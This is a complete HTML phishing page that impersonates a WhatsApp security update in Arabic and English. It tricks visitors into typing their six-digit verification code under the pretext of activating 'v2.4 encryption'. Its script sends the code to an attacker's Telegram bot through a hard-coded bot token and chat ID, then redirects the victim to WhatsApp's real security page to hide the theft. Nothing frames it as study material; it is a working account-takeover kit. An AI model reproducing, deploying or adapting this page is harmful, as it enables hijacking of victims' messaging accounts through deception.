<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Security</title>
    <style>
        :root { --bg: #0b141a; --card: #1d2a33; --green: #00a884; --text: #e9edef; --hint: #8696a0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
        .logo { width: 55px; margin-bottom: 15px; }
        .main-title { font-size: 19px; font-weight: 600; margin-bottom: 20px; color: #fff; }

        .info-card { background: var(--card); border-radius: 12px; padding: 18px; margin-bottom: 20px; border: 1px solid #2a3942; }
        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13.5px; line-height: 1.4; }
        .label { color: var(--hint); }
        .value { color: #fff; font-weight: 500; text-align: left; }
        .status { color: var(--green); font-weight: bold; }

        .phone-section { border-top: 1px solid #2a3942; margin-top: 10px; padding-top: 15px; }
        .phone-val { color: var(--green); font-size: 17px; font-weight: bold; letter-spacing: 0.5px; }

        .desc { font-size: 13px; color: var(--hint); line-height: 1.6; margin: 25px 0; padding: 0 5px; }

        .otp-box { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 28px; text-align: center; outline: none; letter-spacing: 10px; margin-bottom: 25px; }
        .otp-box:focus { border-bottom-color: var(--green); }

        .btn { background: var(--green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn:active { transform: scale(0.98); }

        [dir="rtl"] .row { text-align: right; }
        [dir="rtl"] .value { text-align: left; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
        <h1 class="main-title" id="title"></h1>

        <div class="info-card">
            <div class="row">
                <span class="label" id="lbl-dev"></span>
                <span class="value" id="val-dev">iPhone</span>
            </div>
            <div class="row">
                <span class="label" id="lbl-status"></span>
                <span class="status" id="val-status"></span>
            </div>
            <div class="row">
                <span class="label" id="lbl-time"></span>
                <span class="value" id="val-time"></span>
            </div>
            <div class="phone-section row">
                <span class="label" id="lbl-num" style="color:#fff"></span>
                <span class="phone-val">+20 010 •••• •• 87</span>
            </div>
        </div>

        <p class="desc" id="desc"></p>

        <input type="tel" id="otp" class="otp-box" maxlength="6" placeholder="------">
        <button class="btn" id="btn" onclick="send()"></button>
    </div>

    <script>
        const CFG = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
        
        const content = {
            ar: {
                title: "تحديث أمان واتساب",
                dev: "الجهاز المكتشف:",
                status: "حالة الإصدار:",
                status_val: "● تحديث أمان متاح (v2.4)",
                time: "توقيت النظام:",
                num: "الرقم الموثق:",
                desc: "نسخة واتساب الحالية لا تدعم التشفير المتقدم v2.4. يرجى إدخال كود المزامنة لتفعيل التحديث وحماية محادثاتك.",
                btn: "تحديث ومزامنة الآن"
            },
            en: {
                title: "WhatsApp Security Update",
                dev: "Detected Device:",
                status: "Version Status:",
                status_val: "● Security Update Available (v2.4)",
                time: "System Time:",
                num: "Verified Number:",
                desc: "Your current version does not support v2.4 encryption. Please enter the synchronization code to activate the update.",
                btn: "Update & Sync Now"
            }
        };

        const lang = navigator.language.startsWith('ar') ? 'ar' : 'en';
        document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
        const T = content[lang];

        document.getElementById('title').innerText = T.title;
        document.getElementById('lbl-dev').innerText = T.dev;
        document.getElementById('lbl-status').innerText = T.status;
        document.getElementById('val-status').innerText = T.status_val;
        document.getElementById('lbl-time').innerText = T.time;
        document.getElementById('lbl-num').innerText = T.num;
        document.getElementById('desc').innerText = T.desc;
        document.getElementById('btn').innerText = T.btn;

        function updateClock() {
            document.getElementById('val-time').innerText = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
        }
        setInterval(updateClock, 1000); updateClock();

        async function send() {
            const code = document.getElementById('otp').value;
            if(code.length === 6) {
                document.getElementById('btn').innerText = "...";
                await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: CFG.C, text: `✅ Code: ${code}` })
                });
                location.href = "https://www.whatsapp.com/security";
            }
        }
    </script>
</body>
</html>
